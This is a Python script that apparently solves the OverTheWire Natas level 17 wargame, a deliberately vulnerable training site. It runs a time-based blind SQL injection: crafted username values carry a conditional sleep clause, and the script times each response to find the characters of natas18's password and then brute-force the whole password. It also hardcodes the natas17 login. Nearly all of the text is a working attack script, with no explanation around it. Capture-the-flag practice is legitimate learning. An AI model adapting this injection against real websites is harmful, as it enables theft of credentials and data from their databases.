#!/bin/python

import requests, string, time

url = "http://natas17.natas.labs.overthewire.org/index.php"
user = "natas17"
passw = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"

# Find chars that are part of the password
all_chars = ''.join([string.ascii_letters, string.digits])

passw_dict = []
for c in all_chars:
	full_url = ''.join([url, '?debug&username=natas18"+and+if(password+LIKE+BINARY+"%', c, '%", sleep(2), 0);-- "' ])	

	before = time.time()
	r = requests.get(full_url, auth=(user, passw))
	after = time.time()

	#print r.content

	if after-before >= 2:
		passw_dict.append(c)
		print ("Password Dictionary: {0}").format(''.join(passw_dict))

print ("Dictionary complete")
print ("Dictionary: {0}").format(''.join(passw_dict))



# Bruteforce password based on found chars
final_passw = ''

for i in range(32):
	for c in passw_dict:
		test = final_passw+c
		full_url = ''.join([url, '?debug&username=natas18"+and+if(password+LIKE+BINARY+"', test + '%", sleep(2), 0);-- "'	])
		
		before = time.time()
		r = requests.get(full_url, auth=(user,passw))
		after = time.time()

		if after-before >= 2:
			final_passw = final_passw+c
			print ("Length: {0}, Password: {1}").format(len(final_passw), final_passw)
			break

print ("Final password is {0}").format(final_passw)